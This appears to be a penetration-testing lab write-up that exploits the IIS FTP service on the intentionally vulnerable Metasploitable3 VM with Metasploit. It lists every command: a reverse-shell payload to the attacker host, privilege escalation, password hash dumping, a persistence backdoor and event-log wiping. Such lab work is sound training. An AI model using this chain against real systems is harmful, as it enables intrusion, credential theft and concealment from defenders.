# Metasploit Exploitation

This document outlines the process of exploiting the IIS FTP service on Metasploitable3 using the Metasploit Framework.

## Exploitation Steps

### 1. Starting Metasploit Framework

Started the Metasploit Console:

```bash
msfconsole
```

![attacker 1](./screenshots/attacker-1.png)

### 2. Identifying Appropriate Exploit

Identified the appropriate exploit:

```bash
use exploit/windows/ftp/ms09_053_ftpd_nlst
```

![attacker 2](./screenshots/attacker-2.png)

### 3. Configuring the Exploit

Examined required options:

```bash
show options
```

![attacker 3](./screenshots/attacker-3.png)

Set the required parameters:

```bash
set RHOSTS 192.168.1.X  # Metasploitable3 IP
set RPORT 21
```

![attacker 4](./screenshots/attacker-4.png)

### 4. Selecting and Configuring Payload

Set the payload:

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.Y  # Kali Linux IP
set LPORT 4444
```

![attacker 5](./screenshots/attacker-5.png)

### 5. Executing the Exploit

Launched the exploit:

```bash
exploit
```

[Screenshot: metasploit_execute_exploit.png]

### 6. Post-Exploitation

After successful exploitation, a Meterpreter session was established.

Gathered system information:

```bash
sysinfo
```

[Screenshot: meterpreter_sysinfo.png]

Listed running processes:

```bash
ps
```

[Screenshot: meterpreter_processes.png]

Escalated privileges:

```bash
getsystem
```

[Screenshot: meterpreter_privileges.png]

### 7. Evidence of Compromise

Obtained user credentials:

```bash
hashdump
```

[Screenshot: meterpreter_hashdump.png]

Accessed the file system:

```bash
cd C:\\
ls
```

[Screenshot: meterpreter_filesystem.png]

### 8. Establishing Persistence (Optional)

Created a backdoor service:

```bash
run persistence -X -i 30 -p 4433 -r 192.168.1.Y
```

[Screenshot: meterpreter_persistence.png]

### 9. Clean-up

Removed evidence of intrusion:

```bash
clearev
```

[Screenshot: meterpreter_cleanup.png]

Terminated the session:

```bash
exit
```

[Screenshot: meterpreter_exit.png]
